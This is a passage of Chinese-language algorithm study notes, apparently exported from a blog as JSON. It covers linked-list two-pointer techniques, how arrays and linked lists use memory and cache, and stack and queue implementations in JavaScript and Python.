last;\n}\n```\n\n![image.png|480](https://832-1310531898.cos.ap-beijing.myqcloud.com/caeae889a676751bdd2c7d083c720ecd.png)\n\n## 3. 反转链表的一部分\n\n给一个索引区间 `[m, n]`（索引从 `1` 开始），仅仅反转区间中的链表元素\n\n- 如果 `m == 1`，就相当于反转链表开头的 n 个元素，见  [#二、反转链表前 N 个节点](/post/eCDCTN9z.html#二、反转链表前-N-个节点)\n- 如果 `m != 1`\n\t-  `head` 的索引视为 `1`，那么我们是想从`第 m 个元素`开始反转对吧\n\t-  `head.next` 的索引视为 `1` 呢？那么相对于 `head.next`，反转的区间应该是从`第 m - 1 个元素`开始的。\n\t- 那么对于 `head.next.next` 呢？反转的区间应该是从`第 m - 2 个元素`开始的\n\t- 依次往下推，直到\n\n```javascript\nvar reverseBetween = function (head, m, n) {\n    // ① base case\n    if (m === 1) {\n        // 反转以head开头的n个节点\n        return reverseN(head, n);\n    }\n    // ② 将 head.next 作为起点 反转 前 m-1 个节点\n    head.next = reverseBetween(head.next, m - 1, n - 1);\n    return head;\n}\n```\n\n>  **这个流程图可以不用看**，直接看上面文本更好理解 ，具体分析过程见：  https://www.figma.com/file/9busNTH6MZx5E6ZU8Xfahx/2023.07?type=whiteboard&node-id=25-107&t=T9anQJy5miIZYOFR-4\n\n## 4. 最后\n\n- 不要跳进`递归`， 你的脑袋瓜子能搞几个 `递归`\n- 递归操作链表并不高效。和`迭代解法`相比，虽然时间复杂度都是 `O(N)`，但是迭代解法的`空间复杂度是 O(1)`，而递归解法需要`堆栈`，`空间复杂度`是 `O(N)`\n\n","AEbr01co":"\n# 链表的双指针技巧合集\n\n\n`#算法/链表`\n\n\n\n## 目录\n<!-- toc -->\n ## 第 1 题：合并两个有序单链表 \n\n> [https://leetcode.cn/problems/merge-two-sorted-lists/](https://leetcode.cn/problems/merge-two-sorted-lists/)\n\n**仔细重复的** 看下面的`动图`，有`6个`变量\n\n- `l1` 代表链表 `list1` \n- `p1`  指针指向 链表 `list1` \n- `l2`  代表链表 `list2`\n- `p2` 指针指向链表 `list2` \n- `dummy 节点`  , 「虚拟头结点」\n- `p` 指针指向 虚拟头结点\n\n![|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/a95e9523866627037deca38bff57f245.gif)\n```javascript\n/**\n * Definition for singly-linked list.\n * function ListNode(val, next) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.next = (next===undefined ? null : next)\n * }\n */\n/**\n * @param {ListNode} list1\n * @param {ListNode} list2\n * @return {ListNode}\n */\nvar mergeTwoLists = function (list1, list2) {\n    let p1 = list1;\n    let p2 = list2;\n    let d = new ListNode(0);\n    let p = d;\n    // while (p1 && p2) {\n    // 下面这种while会开快一些，不涉及到自动转化\n    while (p1 != null && p2 != null) {\n        if (p1.val < p2.val) {\n            p.next = p1;\n            p1 = p1.next;\n        } else {\n            p.next = p2;\n            p2 = p2.next;\n        }\n        p = p.next;\n    }\n    // 剩余的直接放在尾部即可\n    if (p1 !== null) {\n        p.next = p1;\n    }\n    if (p2 !== null) {\n        p.next = p2;\n    }\n    return d.next;\n};\n\n```\n\n上面 `while 条件`  的两种写法还是会有性能差异的，如下图：\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/9c4e07ba21ffab641f8328ec40605ea5.png)\n\n\n## 「虚拟头结点」技巧\n\n`dummy` 节点，其实就是一个`占位符` ，有了它，方便处理 `p` 为空指针的场景\n\n什么时候需要用虚拟头结点？\n\n**当你需要创造一条新链表的时候，可以使用虚拟头结点简化边界情况的处理。**，比如 [#第 1 题：合并两个有序单链表](/post/AEbr01co.html#第-1-题合并两个有序单链表) 中 是不是需要创建一个`新的链表`\n\n> [!info]\n以后虚拟头结点都使用 变量 `d` 代替，方便 code\n\n\n## 第 2 题：分隔链表\n\n> [https://leetcode.cn/problems/partition-list/](https://leetcode.cn/problems/partition-list/)\n\n![|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/69c926657ba9b5889d24dd3ad5c220ed.png)\n\n**分析：**\n原链表分成`两个小链表`，一个链表中的元素大小都小于 `x`，另一个链表中的元素都大于等于 `x`，最后再把这两条链表接到一起\n\n**要点分析：**\n\n- 两个虚拟头结点 `dummy1 和 dummy2`，分别用于存储大于和小于  `x` 的节点，并使用两个指针 `p1`  `p2` ，并指向它对应的虚拟头结点\n- `p` 指向`原链表` ，并且每次` while` 循环都更新 `p`  (一定要注意断开每个节点的 `next` 指针)\n- 最后，连接两个 虚拟头结点，返回 `dummy1.next`\n\n```javascript\nvar partition = function (head, x) {\n    // 存放小于 x 的链表的虚拟头结点\n    var dummy1 = new ListNode(-1);\n    // 存放大于等于 x 的链表的虚拟头结点\n    var dummy2 = new ListNode(-1);\n    // p1, p2 指针负责生成结果链表\n    var p1 = dummy1, p2 = dummy2;\n    // p 负责遍历原链表，类似合并两个有序链表的逻辑\n    // 这里是将一个链表分解成两个链表\n    var p = head;\n    while (p !== null) {\n        if (p.val >= x) {\n            p2.next = p;\n            p2 = p2.next;\n        } else {\n            p1.next = p;\n            p1 = p1.next;\n        }\n    // 原链表的指针不断前进 \n    // p = p.next;\n    ////////// ==============>\n        // 断开原链表中的每个节点的 next 指针\n        var temp = p.next;\n        p.next = null;\n        p = temp;\n    }\n    \n    // 连接两个链表\n    p1.next = dummy2.next;\n    return dummy1.next;\n}\n```\n\n### 踩过的坑\n\n![|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/5730a315459e150017323bbcdaddd6ab.png)\n\n#### 解决方法 1\n\n断开原链表中的每个节点的 `next` 指针 ，具体代码如上\n\n#### 解决方法 2\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/a091f56e19c9fcaaac00e6e23b6af9e7.png)\n\n## 第 3 题：合并 k 个有序链表@TODO\n\n[https://leetcode.cn/problems/merge-k-sorted-lists/](https://leetcode.cn/problems/merge-k-sorted-lists/)\n\n### 题目\n![|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/086fb314d78535b9d53982f756f711be.png)\n\n### 看代码\n```javascript\n/**\n * Definition for singly-linked list.\n * function ListNode(val, next) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.next = (next===undefined ? null : next)\n * }\n */\n\n/**\n * @param {ListNode[]} lists\n * @return {ListNode}\n * 分析:\n * 1、关键是 优先级队列的 【入队函数】的实现\n * 2、优先级队列的【权重】就是单链表Node节点的val值\n */\nvar mergeKLists = function (lists) {\n    if (lists.length === 0) {\n        return null\n    }\n    // 虚拟头结点\n    let dummy = new ListNode(-1);\n    // 指针指向 虚拟头结点 , 用于移动\n    let p = dummy;\n    // 优先级队列，值最小的先入队，即优先级最高\n    let q = [];\n    // 优先队列的【入队函数】，值最小的先入队列\n    let enqueue = (node) => {\n        if (q.length === 0) {\n            q.push(node);\n        } else {\n            // 是否插入了\n            let added = false;\n            for (let i = 0; i < q.length; i++) {\n                if (node.val < q[i].val) {\n                    q.splice(i, 0, node)\n                    added = true;\n                    break;\n                }\n            }\n            // 没找到合适的插入位置，则添加到末尾\n            if (!added) {\n                q.push(node);\n            }\n        }\n    }\n    // 遍历lists , 入队链表数组的每个元素\n    for (let i = 0; i < lists.length; i++) {\n        if (lists[i] !== null) {\n            enqueue(lists[i])\n        }\n    }\n    // 优先级队列有值，则继续遍历\n    while (q.length !== 0) {\n        // 取出 优先级队列里的第一个\n        let node = q.shift();\n        // p指针指向 把取出的节点\n        p.next = node;\n        // 检测node.next 否则，重新入队\n        if (node.next !== null) {\n            // ::::关键\n            enqueue(node.next);\n        }\n        // p 指针不断前进\n        p = p.next;\n    }\n    return dummy.next;\n};\n\n```\n\n### 时间复杂度分析\n\n> [!todo]\n 复杂度，没弄明白，再研究！\n\n分析：`q` 代表优先级队列，假设所有节点都会入队，所以 q 的长度为上限为 `N`\n这个算法复杂度，没弄明白？ 因为并不是自己实现了\n> 算法整体的时间复杂度是 `O(Nlogk)`\n> - 其中 `k` 是 **链表的条数**，即有几个链表，即 提设中，`lists` 的长度\n> - `N` 是 **这些链表的节点总数**。\n\n> [!question]\n这个题，并没有双指针，就是单指针\n\n\n## 第 4 题：删除链表的倒数第 N 个结点\n\n[https://leetcode.cn/problems/remove-nth-node-from-end-of-list/](https://leetcode.cn/problems/remove-nth-node-from-end-of-list/)\n\n### 先找到单链表的倒数第 k 个节点\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/ac036e825212ca37f1a513d5e8b41e08.png)\n\n代码如下：\n\n```javascript\n/**\n * @param {ListNode} head\n * @param {number} n\n * @return {ListNode}\n */\nvar removeNthFromEnd = function (head, n) {\n    // 使用了虚拟头结点的技巧，也是为了防止出现空指针的情况，见备注\n    let dummy = new ListNode(-1);\n    // 第一步，使用双指针 先找到 倒数第 n 个节点\n    let p1 = head;\n    let p2 = dummy;\n    p2.next = head;\n    // p1 先走 n 步\n    for (let i = 0; i < n; i++) {\n        p1 = p1.next;\n    }\n    // p1 和 p2 同时走 k 步\n    while (p1 != null) {\n        p2 = p2.next;\n        p1 = p1.next;\n    }\n    // 这个时候找到了\n    \n    // 删掉倒数第 n 个节点\n    p2.next = p2.next.next;\n    return dummy.next;\n};\n\n```\n\n>  使用了`虚拟头结点`的技巧，也是为了防止出现空指针的情况，比如说链表总共有 5 个节点，题目就让你删除倒数第 5 个节点，也就是第一个节点，那按照算法逻辑，应该首先找到倒数第 6 个节点。但第一个节点前面已经没有节点了，这就会出错。\n\n\n## 第 5 题：单链表的中点\n\n> [https://leetcode.cn/problems/middle-of-the-linked-list/](https://leetcode.cn/problems/middle-of-the-linked-list/)\n\n\n\n![|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/a1643b47243c1d93a8beb6c2d8c4f8c6.png)\n\n\n### 使用快慢指针\n\n```javascript\n/**\n * @param {ListNode} head\n * @return {ListNode}\n */\nvar middleNode = function (head) {\n    let slow = head;\n    let fast = head;\n\n    // 需要判断fast.next.next 是否存在\n    while (fast !== null && fast.next !== null) {\n        slow = slow.next;\n        fast = fast.next.next;\n    }\n    return slow;\n};\n```\n\n>  \n>  注：需要注意的是，如果链表长度为`偶数`，也就是说中点有两个的时候，我们这个解法返回的节点是`靠后的那个节点`。\n\n\n## 第 6 题：判断链表是否包含环\n\n每当`慢指针 slow` 前进一步，`快指针 fast` 就前进两步。\n\n- 如果 `fast` 最终遇到空指针，说明链表中没有环；\n- 如果 `fast` 最终和 slow `相遇`，那肯定是 `fast` 超过了 `slow` 一圈，说明链表中含有环。\n\n代码如下：\n```javascript\nfunction hasCycle(head) {\n    // 快慢指针初始化指向 head\n    var slow = head, fast = head;\n    // 快指针走到末尾时停止\n    while (fast != null && fast.next != null) {\n        // 慢指针走一步，快指针走两步\n        slow = slow.next;\n        fast = fast.next.next;\n        // 快慢指针相遇，说明含有环\n        if (slow == fast) {\n            return true;\n        }\n    }\n    // 不包含环\n    return false;\n}\n```\n\n> [!NOTE]\n疑问❓\n不会死循环嘛？比如这是一个循环列表 → 最终是会相遇的，如何相遇？ 理解成学校操场 400m 场地跑步，一个跑的快，一个跑得慢。**所以，最终还是会追上的** \n\n\n\n## 第 7 题：环形链表 II\n\n> [https://leetcode.cn/problems/linked-list-cycle-ii/](https://leetcode.cn/problems/linked-list-cycle-ii/)\n\n如果已经已知 链表中含有环，如何计算这个`环的起点`？\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/bf3e2cd2adc9587dc1358f50421a5867.png)\n\n### 先说结论\n\n当`快慢指针`相遇时，让其中任一个指针指向`头节点`，然后让它俩以`相同速度`前进，`再次相遇时`所在的节点位置就是环开始的位置\n\n### 结论的推导过程\n\n假设**快慢指针相遇**时，慢指针 `slow` 走了 `k` 步，那么快指针 `fast` 一定走了 `2k` 步，且 ==K 一定是环长度的整数倍==，如下图：\n\n![|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/05a057ac16843558f9b5679574a82bfb.png)\n\n再假设相遇点距环的起点的距离为 `m` ， 那么结合上图的 `slow` 指针，环的起点距`头结点 head` 的距离为 `k - m`，也就是说如果从 `head` 前进 `k - m` 步就能到 达`环起点`。\n巧的是，如果从`相遇点`继续前进 `k - m` 步，也恰好到达`环起点`。因为结合上图的 fast 指针，从相遇点开始走k步可以转回到相遇点，那走 k - m 步肯定就走到环起点了\n所以，只要我们把快慢指针中的任一个重新指向 `head`，然后两个指针**同速前进**，`k - m` 步后一定会相遇，相遇之处就是环的起点了。\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/7b7ad20123d2f237f850b1e6d6593fdb.png)\n\n### 代码\n```javascript\nvar detectCycle = function (head) {\n    var fast, slow;\n    fast = slow = head;\n    //// ::::第一步： 相遇时，即相遇点，\n    while (fast != null && fast.next != null) {\n        fast = fast.next.next;\n        slow = slow.next;\n        if (fast === slow) break;\n    }\n    // 上面的代码类似 hasCycle 函数\n    if (fast == null || fast.next == null) {\n        // fast 遇到空指针说明没有环\n        return null;\n    }\n    // ::::第二步：在相遇点，重新同速度前进\n    \n    // 重新指向头结点\n    slow = head;\n    // 快慢指针同步前进，相交点就是环起点\n    while (slow !== fast) {\n        fast = fast.next;\n        slow = slow.next;\n    }\n    return slow;\n};\n```\n\n## 第 8 题：两个链表是否相交\n\n> [https://leetcode.cn/problems/intersection-of-two-linked-lists/](https://leetcode.cn/problems/intersection-of-two-linked-lists/)\n\n\n如下面，相交，所以返回 `c1`\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/def94355a4edce1c7384c0730bbb2a6a.png)\n又如下面，返回，`8`\n![|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/fdee7a7947e38677438607d6ee9de92f.png)\n\n### 思路 1\n\n通过 `hash` 来判断出现过的次数，如果出现过两次，则说明相交了，但空间复杂度略高，需要额外的空间。即空间复杂度为 `O(m+n)`\n\n### 思路 2\n\n关键点在于，拼接，哪个先遍历完，指针指向另外一个\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/beaa1e2785882f802f7c0c94903ebaf2.png)\n\n空间复杂度为 `O(1)`，时间复杂度为 `O(N)`\n\n### 代码\n```javascript\nvar getIntersectionNode = function (headA, headB) {\n    // 都指向各自的头结点\n    let p1 = headA;\n    let p2 = headB;\n    while (p1 !== p2) {\n        if (p1 === null) {\n            p1 = headB;\n        } else {\n            p1 = p1.next;\n        }\n        if (p2 === null) {\n            p2 = headA;\n        } else {\n            p2 = p2.next;\n        }\n    }\n    return p1;\n};\n\n```\n\n### 疑问\n\n那你可能会问，如果说**两个链表没有相交点**，是否能够正确的返回 `null` 呢？\n这个逻辑可以覆盖这种情况的，相当于 c1 节点是  `null空指针`，可以正确返回 null\n\n\n","bLoMlQVO":"\n# 数组链表与内存缓存的关系\n\n`#数据结构` `#操作系统` \n\n\n## 目录\n<!-- toc -->\n ## 数据结构与物理结构 \n\n- 数组：代表`连续存储`的物理结构\n- 链表：代表`分散存储`的物理结构\n\n**物理结构在很大程度上决定了程序对内存和缓存的使用效率**，进而影响算法程序的整体性能\n\n## 计算机存储设备\n\n- **硬盘**用于长期存储大量数据\n- **内存**用于临时存储程序运行中正在处理的数据\n- 而**缓存**则用于存储经常访问的数据和指令\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921073610.png)\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921073632.png)\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921073754.png)\n\n## 数据结构与内存的关系\n\n数组和链表在内存利用方面各有优缺点\n- 数组空间利用率高但扩容成本大\n\t- 优点\n\t\t- 数组存储是整块的，所以不容易导致内存碎片化\n\t- 缺点\n\t\t- 可能导致内存浪费\n\t\t- 扩容成本高\n- 链表灵活性强但易导致内存碎片化\n\t- 链表以“节点”为单位进行动态内存分配和回收\n\t- 但在程序运行时，**随着反复申请与释放内存，空闲内存的碎片化程度会越来越高**\n\n\n## 数据结构与缓存效率\n\n当 CPU 尝试访问的数据不在缓存中时，就会发生**缓存未命中**（cache miss），此时 CPU 不得不从速度较慢的内存中加载所需数据\n\n所以，**“缓存未命中”越少，CPU 读写数据的效率就越高**，程序性能也就越好；\n\n\n为了尽可能达到更高的效率，缓存会采取以下数据**加载机制**。\n- **缓存行**：缓存不是单个字节地存储与加载数据，而是**以缓存行为单位**。相比于单个字节的传输，缓存行的传输形式更加高效。\n- **预取机制**：处理器会尝试预测数据访问模式（例如顺序访问、固定步长跳跃访问等），并根据特定模式将数据加载至缓存之中，从而提升命中率。\n- **空间局部性**：如果一个数据被访问，那么**它附近的数据可能近期也会被访问**。因此，缓存在加载某一数据时，也会加载其附近的数据，以提高命中率。\n- **时间局部性**：如果一个数据被访问，那么**它在不久的将来很可能再次被访问**。缓存利用这一原理，通过保留最近访问过的数据来提高命中率\n\n**数组和链表对缓存的利用效率是不同的**，主要体现在以下几个方面。\n- **占用空间**：链表元素比数组元素占用空间更多，导致缓存中容纳的有效数据量更少。\n- **缓存行**：链表数据分散在内存各处，而缓存是“**按行**加载”的，因此加载到无效数据的比例更高。\n- **预取机制**：数组比链表的数据访问模式更具“可预测性”，即系统更容易猜出即将被加载的数据。\n- **空间局部性**：数组被存储在集中的内存空间中，因此被加载数据附近的数据更有可能即将被访问。\n\n### 结论\n\n总体而言，**数组具有更高的缓存命中率，因此它在操作效率上通常优于链表** \n","xa1FZeHs":"\n# 栈与列队\n\n`#2024/08/11` `#算法` `#数据结构` \n\n\n## 目录\n<!-- toc -->\n ## 操作受限的数据结构：栈和列队 \n\n- **队列**只能在一端插入元素，另一端删除元素\n- **栈**只能在某一端插入和删除元素\n- **双向队列**兼具**栈与队列**的逻辑\n\n\n## 其他注意点\n\n- 浏览器的前进后退功能本质上是“栈”的体现\n\n## 目录\n\n- [1. 栈：Python 描述](/post/Bo2lpNrB.html)\n- [2. 列队：Python 描述](/post/Qz1pMS5p.html)\n- [3. 双向队列：Python 描述](/post/FoFMxfNa.html)","Bo2lpNrB":"\n# 栈：Python 描述\n\n`#数据结构/栈`  `#栈`\n\n\n## 目录\n<!-- toc -->\n ## 1. 栈的定义 \n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921080651.png)\n\n## 2. 栈的常用操作\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921081602.png)\n\n## 3. 基于数组的实现\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921081139.png)\n\n```python\nclass ArrayStack:\n    \"\"\"构造方法：初始化一个空栈\"\"\"\n    def __init__(self):\n        self.data = []\n    \"\"\"返回栈的大小\"\"\"\n    def size(self):\n        return len(self.data)\n    \"\"\"判断栈是否为空\"\"\"\n    def isEmpty(self):\n        return len(self.data) == 0\n    \"\"\"将 item 压入栈中\"\"\"\n    def push(self, item):\n        self.data.append(item)\n    \"\"\"将栈顶元素弹出\"\"\"\n    def pop(self):\n        if self.isEmpty():\n            raise Exception(\"stack is empty\")\n        return self.data.pop()\n    \"\"\"返回栈顶元素\"\"\"\n    def peek(self):\n        if self.isEmpty():\n            raise Exception(\"stack is empty\")\n        return self.data[-1]\n```\n\n## 4. 基于链表的实现\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240921081205.png)\n\n> [!danger]\n> 关键是要关注上图，其实就是一条单链表 5→2→3→1→null ，然后入栈出栈都参考单链表来操作即可\n\n```python\n\"\"\"节点类: 用于构造链表节点\"\"\"\nclass ListNode:\n    def __init__(self,val:int) -> None:\n        # 节点值\n        self.val = val\n        # listNode | Node 代表 self.next 的值可能是 listNode | Node\n        self.next:ListNode | None = None\n\nclass LinkedStack:\n    \"\"\"构造方法：初始化一个空栈\"\"\"\n    def __init__(self):\n        # 栈顶元素\n        self.head:ListNode | None = None\n        self.sz = 0\n\n    \"\"\"返回栈的大小\"\"\"\n    def size(self):\n        return self.sz\n\n    \"\"\"判断栈是否为空\"\"\"\n    def isEmpty(self):\n        return self.sz == 0\n\n    \"\"\"将 item 压入栈中\"\"\"\n    def push(self, val):\n        node = ListNode(val)\n        # 将新节点的 next 指向原来的栈顶元素\n        node.next = self.head\n        # 更新栈顶元素\n        # 将 head 指向新节点\n        self.head = node\n        self.sz += 1\n\n    \"\"\"将栈顶元素弹出\"\"\"\n    def pop(self):\n        if self.isEmpty():\n            raise Exception(\"stack is empty\")\n        # 临时保存栈顶元素\n        item = self.head\n        # 将 head 指向下一个元素\n        # 删除栈顶元素，直接将 head 指向下一个元素即可\n        if self.head is not None:\n            self.head = self.head.next\n        self.sz -= 1\n        return item\n\n    \"\"\"返回栈顶元素\"\"\"\n    def peek(self):\n        if self.isEmpty():\n            raise Exception(\"stack is empty\")\n        if self.head is not None:\n            return self.head\n\n```\n\n## 5. 两种实现的对比\n\n- 时间\n\t- 基于数组实现的栈在触发扩容时效率会降低，但由于扩容是低频操作，因此平均效率更高。\n\t- 基于链表实现的栈可以提供更加稳定的效率表现\n- 空间\n\t- 数组需要可能会造成一点的空间浪费\n\t- 链表节点需要额外存储指针，**因此链表节点占用的空间相对较大**\n\n## 6. 栈的应用\n\n- 浏览器中的后退与前进\n- 软件中的撤销与反撤销\n- 程序内存管理。每次调用函数时，系统都会在栈顶添加一个**栈帧**，用于记录函数的**上下文信息**。在递归函数中，向下递推阶段会不断执行入栈操作，而向上回溯阶段则会不断执行出栈操作\n","Qz1pMS5p":"\n# 列队：Python 描述\n\n`#列队` `#算法/列队` `#数据结构/列队`  `#环形数组`\n\n\n## 目录\n<!-- toc -->\n ## 1. 定义 \n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922084616.png)\n\n## 2. 列队的常用操作\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922084657.png)\n\n> JavaScript 的**入队**操作是是 `push`  ，**出队**操作是 `shift`\n\n## 3. 基于链表的实现\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922090013.png)\n\n入队 \n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922090023.png)\n\n出队\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922090053.png)\n\n### 3.1. 完全实现\n```python\n\"\"\"节点类: 用于构造链表节点\"\"\"\nclass ListNode:\n    def __init__(self,val:int) -> None:\n        # 节点值\n        self.val = val\n        # listNode | Node 代表 self.next 的值可能是 listNode | Node\n        self.next:ListNode | None = None\n\n# 基于链表的队列\nclass linkedQueue:\n    def __init__(self):\n        # 队列的头\n        self.head = None\n        # 队列的大小\n        self.sz = 1\n\n    # 返回队列的大小\n    def size(self):\n        return self.sz\n\n    # 判断队列是否为空\n    def isEmpty(self):\n        return self.sz == 0\n\n    # 入队\n    def enqueue(self, val):\n        # 创建一个新节点\n        node = ListNode(val)\n        # 如果队列为空\n        if self.head is None:\n            self.head = node\n        # 如果队列不为空\n        else:\n            # 将新节点插入到队列的尾部 【底部】\n            p = self.head\n            while p.next is not None:\n                p = p.next\n            p.next = node\n        self.sz += 1\n\n    # 出队\n    def dequeue(self):\n        if self.isEmpty():\n            raise Exception(\"queue is empty\")\n        # 保存队头元素\n        item = self.head\n        # 删除队头元素\n        # 直接将 head 指向下一个元素即可\n        # 但是要注意，如果 head 是 None，就不需要再指向下一个元素了\n        # 因为 head 是 None 说明队列为空，没有下一个元素了\n        # 所以这里需要判断一下 head 是否是 None\n        if self.head is not None:\n            self.head = self.head.next\n        self.sz -= 1\n        return item\n\n    # 返回队头元素\n    def peek(self):\n        if self.isEmpty():\n            raise Exception(\"queue is empty\")\n        return self.head\n```\n\n### 3.2. 基于 deque 的实现\n\n```python\nfrom collections import deque\n\n# 用链表作为底层数据结构实现队列\n# Python 的 deque 就是双链表\nclass MyLinkedQueue:\n    def __init__(self):\n        self.list = deque()\n\n    # 向队尾插入元素，时间复杂度 O(1)\n    def enqueue(self, e):\n        self.list.append(e)\n\n    # 从队头删除元素，时间复杂度 O(1)\n    def dequeue(self):\n        # 使用双端队列的 popleft 方法\n        # 即从队头删除元素\n        # popleft 代表从左边删除元素\n        return self.list.popleft()\n\n    # 查看队头元素，时间复杂度 O(1)\n    def peek(self):\n        return self.list[0]\n\n    # 返回队列中的元素个数，时间复杂度 O(1)\n    def size(self):\n        return len(self.list)\n\n```\n\n## 4. 基于数组的实现\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240922092307.png)\n\n### 4.1. 先看下环形数组技巧\n\n> [!danger]\n> 环形数组技巧利用求模（余数）运算，将普通数组变成逻辑上的环形数组，可以让我们**用 `O(1)` 的时间在数组头部增删元素**\n\n先看个示例，把数组循环打印\n\n```python\narr = [1, 2, 3, 4, 5]\n\n# 循环打印列表，当打印完成后，继续打印列表，一直循环\ni = 0\nwhile i < len(arr):\n    print(arr[i])\n    # 当 i 等于列表的最后一个元素时，将 i 设置为 0\n    # 求模运算 %，也就是求余数\n    # 当 i 到达数组末尾元素时，i + 1 和 arr.length 取余数又会变成 0，即会回到数组头部\n    # 这样就在逻辑上形成了一个环形数组，永远遍历不完\n    i = (i + 1) % len(arr)\n\n```\n\n#### 4.1.1. 比较复杂的版本：考虑扩容等\n\n> [!danger]\n> 知道就行，没必要，Python 内置的很多内容足够用了，不需要实现\n\n>  `[start, end)` 注意区间\n```python\nclass CycleArray:\n    def __init__(self, size: int) -> None:\n        # 数组容量\n        self.capacity = size\n        # 数组,初始化为 None\n        self.arr = [None] * size\n        # start 指针 指向第一个有效元素的索引\n        self.start = 0\n        # end 指针 指向最后一个有效元素的下一个位置索引\n        self.end = 0\n        self.count = 0\n\n    def resize(self, newSize):\n        # 创建新数组\n        new_arr = [None] * newSize\n        # 将原数组的元素复制到新数组\n        for i in range(self.count):\n            new_arr[i] = self.arr[(self.start + i) % self.capacity]\n        # 更新数组\n        self.arr = new_arr\n        # 更新 start 指针\n        self.start = 0\n        # 更新 end 指针\n        self.end = self.count\n        # 更新容量\n        self.capacity = newSize\n\n    # 在队头添加元素\n    def add_first(self, val):\n        # 如果队列已满，扩容 2 倍\n        if self.is_full():\n            self.resize(self.capacity * 2)\n        # 因为 start 是闭区间，所以先左移，再赋值\n        self.start = (self.start - 1 + self.capacity) % self.capacity\n        self.arr[self.start] = val\n        self.count += 1\n    # 删除队头元素\n    def remove_first(self):\n        if self.is_empty():\n            raise Exception(\"Array is empty\")\n        self.arr[self.start] = None\n        self.start = (self.start + 1) % self.capacity\n        self.count -= 1\n        if self.count > 0 and self.count == self.capacity // 4:\n            self.resize(self.capacity // 2)\n\n    def add_last(self, val):\n        if self.is_full():\n            self.resize(self.capacity * 2)\n        self.arr[self.end] = val\n        self.end = (self.end + 1) % self.capacity\n        self.count += 1\n\n    def remove_last(self):\n        if self.is_empty():\n            raise Exception(\"Array is empty\")\n        self.end = (self.end - 1 + self.capacity) % self.capacity\n        self.arr[self.end] = None\n        self.count -= 1\n        if self.count > 0 and self.count == self.capacity // 4:\n            self.resize(self.capacity // 2)\n\n    def get_first(self):\n        if self.is_empty():\n            raise Exception(\"Array is empty\")\n        return self.arr[self.start]\n\n    def get_last(self):\n        if self.is_empty():\n            raise Exception(\"Array is empty\")\n        return self.arr[(self.end - 1 + self.capacity) % self.capacity]\n\n    def is_full(self):\n        return self.count == self.capacity\n\n    def size(self):\n        return self.count\n\n    def is_empty(self):\n        return self.count == 0\n\n```\n\n#### 4.1.2. 使用 deque：最好的方式\n\n```python\nfrom collections import deque\n\n# 创建一个最大长度为 5 的环形数组\ncircular_array = deque(maxlen=5)\n\n# 添加元素\nfor i in range(7):\n    circular_array.append(i)\n    print(f\"After appending {i}: {list(circular_array)}\")\n    \n# 输出：\n# After appending 0: [0]\n# After appending 1: [0, 1]\n# After appending 2: [0, 1, 2]\n# After appending 3: [0, 1, 2, 3]\n# After appending 4: [0, 1, 2, 3, 4]\n# After appending 5: [1, 2, 3, 4, 5]\n# After appending 6: [2, 3, 4, 5, 6]\n    \n# 从左侧添加元素\ncircular_array.appendleft(10)\nprint(f\"After appendleft 10: {list(circular_array)}\")\n# 输出：After appendleft 10: [10, 2, 3, 4, 5]\n```\n\n### 4.2. 使用 deque 实现列队：最佳方案\n\n```python\nfrom collections import deque\n\n# 用deque 来实现队列\nclass MyQueue:\n    def __init__(self):\n        self.list = deque()\n\n    # 向队尾插入元素，时间复杂度 O(1)\n    def enqueue(self, e):\n        self.list.append(e)\n\n    # 从队头删除元素，时间复杂度 O(1)\n    def dequeue(self):\n        return self.list.popleft()\n\n    # 查看队头元素，时间复杂度 O(1)\n    def peek(self):\n        return self.list[0]\n\n    # 返回队列中的元素个数，时间复杂度 O(1)\n    def size(self):\n        return len(self.list)\n\n```\n\n## 5. 再看下环形数组\n\n### 5.1. 实现方式\n\n1. 对于大多数情况，`collections.deque` 是最佳选择，因为它是 Python 标准库的一部分，性能好，使用简单。\n2. 如果你需要更多的控制或者想要理解环形数组的工作原理，可以自己实现一个简单的版本。\n3. 对于特殊需求，比如需要进行大量数值计算，可以考虑使用 **NumPy**。\n4. 如果需要更专门的**环形缓冲区**实现，可以考虑使用第三方库如 **CircularBuffer**。\n\n### 5.2. 使用场景\n\n1. 缓冲区管理\n    - 音频和视频流处理：在处理连续的音频或视频数据时，环形缓冲区可以用来存储最近的一段数据，便于**回放或处理**。\n    - 网络数据包处理：网络设备可以使用**环形缓冲区**来临时存储接收到的数据包，等待处理。\n2. 任务调度\n    - 